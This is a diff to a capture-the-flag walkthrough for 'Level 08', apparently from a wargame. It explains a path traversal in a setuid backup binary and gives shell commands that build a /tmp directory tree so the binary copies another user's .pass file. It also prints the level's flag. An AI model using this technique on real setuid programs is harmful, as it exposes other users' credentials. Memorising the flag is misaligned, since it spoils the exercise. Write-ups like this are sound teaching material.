@@ -1,20 +1,37 @@
 # Level 08 Walkthrough
 
 ## Vulnerability
-The `level08` binary is a setuid program that backs up a file provided as an argument to a `./backups/` directory.
-It constructs the backup path by concatenating `./backups/` with the provided filename.
-It attempts to open the source file and the destination file.
 
-The vulnerability lies in the fact that it does not create the directory structure for the destination file. However, if we create the directory structure ourselves, we can trick it into writing to a location we control (or rather, a location it can write to, which we can then read).
+**Path Traversal in Backup Utility**
+
+The `level08` binary is a setuid program that backs up a file to a `./backups/` directory.
+
+The vulnerability is in how it constructs the destination path:
+```c
+strcpy(dest_path, "./backups/");
+strcat(dest_path, argv[1]);  // No sanitization!
+```
+
+When you provide an **absolute path** like `/home/users/level09/.pass`, the destination becomes:
+```
+./backups//home/users/level09/.pass
+```
+
+The double slash `//` is treated as a single `/` by the filesystem, so this resolves to:
+```
+./backups/home/users/level09/.pass
+```
+
+The binary doesn't create the directory structure - it expects it to exist. We can exploit this by:
+1. Creating the directory structure in a writable location (`/tmp`)
+2. Running the binary from there
+3. The binary (running as level09) can read `/home/users/level09/.pass`
+4. It writes the copy to our controlled directory where we can read it
 
 ## Exploit
-1.  The target file is `/home/users/level09/.pass`.
-2.  The binary tries to write to `./backups/home/users/level09/.pass`.
-3.  We create this directory structure in a writable location (e.g., `/tmp`).
-4.  We run the binary from that location.
 
 ```bash
-# Create the directory structure
+# Create the directory structure (only the path, not .log file)
 mkdir -p /tmp/my_exploit/backups/home/users/level09
 
 # Go to our exploit directory
@@ -26,6 +43,8 @@ cd /tmp/my_exploit
 # Read the backed-up password
 cat backups/home/users/level09/.pass
 ```
+
+**Note:** The binary may attempt to write to `./backups/.log` for logging, but it doesn't exit if this fails, so we don't need to create it.
 
 ## Flag
 `fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S`
